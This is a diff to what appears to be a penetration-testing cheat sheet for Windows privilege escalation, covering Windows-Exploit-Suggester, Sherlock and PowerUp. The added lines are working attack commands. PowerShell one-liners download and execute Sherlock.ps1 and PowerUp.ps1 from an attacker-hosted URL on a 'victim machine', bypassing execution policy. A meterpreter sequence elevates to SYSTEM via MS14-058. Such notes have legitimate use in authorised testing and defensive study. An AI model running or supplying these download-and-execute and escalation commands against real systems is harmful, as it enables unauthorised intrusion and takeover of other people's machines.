@@ -1,7 +1,4 @@
 
-Powersploit
-Powerup
-
 ---------------------------Windows-Exploit-Suggester---------------------------
 
 # update the database and copy the db file name in the output
@@ -19,11 +16,29 @@ post/multi/recon/local_exploit_suggester
 
 ---------------------------Sherlock---------------------------
 
-# send the sherlock.ps1 file to low privileged shell
+# send the sherlock.ps1 file to low privileged shell and run it
+echo IEX(New Object Net.WebClient).downloadString('http://<targetip>:<port>/Sherlock.ps1') | powershell -noprofile -
 
-beacon> getuid
-beacon> powershell-import C:\Users\Rasta\Desktop\Sherlock.ps1
-beacon> powershell Find-MS14058
-beacon> elevate ms14-058 smb
-beacon> getuid
+powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://<targetip>:<port>/Sherlock.ps1') ; Find-AllVulns"
 
+# If you have your ps1 file downloaded to the victim machine then run using this
+powershell.exe -exec bypass -Command "& {Import-Module .\Sherlock.ps1; Find-AllVulns}"
+
+# meterpreter commands
+load powershell
+getuid
+powershell-import C:\tmp\Sherlock.ps1
+powershell Find-MS14058
+elevate ms14-058 smb
+getuid
+
+----------------------------------------PowerUp----------------------------------
+
+# download PowerUp.ps1 and check for vulnerabilities
+powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://<targetip>:<port>/PowerUp.ps1') ; Invoke-AllChecks"
+
+# change execution policy & download PowerUp.ps1 and check for vulnerabilities
+powershell.exe -ExecutionPolicy Bypass -noLogo -Command "IEX(New-Object Net.WebClient).downloadString('http://<targetip>:<port>/powerup.ps1') ; Invoke-AllChecks"
+
+# If you have your ps1 file downloaded to the victim machine then run using this
+powershell.exe -exec bypass -Command "& {Import-Module .\PowerUp.ps1; Invoke-AllChecks}"
